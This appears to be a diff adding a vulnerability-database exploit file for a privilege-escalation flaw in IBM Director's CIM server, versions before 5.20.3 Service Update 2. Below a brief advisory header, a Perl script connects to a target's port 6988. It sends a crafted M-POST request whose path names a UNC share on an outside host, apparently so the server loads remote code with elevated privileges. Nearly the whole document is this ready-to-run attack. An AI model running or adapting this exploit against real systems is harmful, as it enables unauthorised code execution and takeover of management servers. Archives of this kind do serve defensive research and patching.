@@ -1,0 +1,56 @@
+source: http://www.securityfocus.com/bid/34065/info
+
+IBM Director is prone to a privilege-escalation vulnerability that affects the CIM server.
+
+Attackers can leverage this issue to execute arbitrary code with elevated privileges in the context of the CIM server process.
+
+Versions prior to IBM Director 5.20.3 Service Update 2 are affected. 
+
+use IO::Socket;
+#1st argument: target host
+my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                                 PeerPort => "6988",
+                                 Proto    => 'tcp');
+$payload =
+qq{<?xml version="1.0" encoding="utf-8" ?>
+<CIM CIMVERSION="2.0" DTDVERSION="2.0">
+ <MESSAGE ID="1007" PROTOCOLVERSION="1.0">
+  <SIMPLEEXPREQ>
+    <EXPMETHODCALL NAME="ExportIndication">
+     <EXPPARAMVALUE NAME="NewIndication">
+      <INSTANCE CLASSNAME="CIM_AlertIndication" >
+        <PROPERTY NAME="Description" TYPE="string">
+          <VALUE>Sample CIM_AlertIndication indication</VALUE>
+        </PROPERTY>
+        <PROPERTY NAME="AlertType" TYPE="uint16">
+          <VALUE>1</VALUE>
+        </PROPERTY>
+        <PROPERTY NAME="PerceivedSeverity" TYPE="uint16">
+          <VALUE>3</VALUE>
+        </PROPERTY>
+        <PROPERTY NAME="ProbableCause" TYPE="uint16">
+          <VALUE>2</VALUE>
+        </PROPERTY>
+        <PROPERTY NAME="IndicationTime" TYPE="datetime">
+          <VALUE>20010515104354.000000:000</VALUE>
+        </PROPERTY>
+      </INSTANCE>
+    </EXPPARAMVALUE>
+  </EXPMETHODCALL>
+ </SIMPLEEXPREQ>
+ </MESSAGE>
+</CIM>};
+$req =
+"M-POST /CIMListener/\\\\isowarez.de\\director\\wootwoot HTTP/1.1\r\n"
+."Host: $ARGV[0]\r\n"
+."Content-Type: application/xml; charset=utf-8\r\n"
+."Content-Length: ". length($payload) ."\r\n"
+."Man: http://www.dmtf.org/cim/mapping/http/v1.0 ; ns=40\r\n"
+."CIMOperation: MethodCall\r\n"
+."CIMExport: MethodRequest\r\n"
+."CIMExportMethod: ExportIndication\r\n\r\n";
+print $sock $req . $payload;
+
+while(<$sock>) {
+	print;
+}
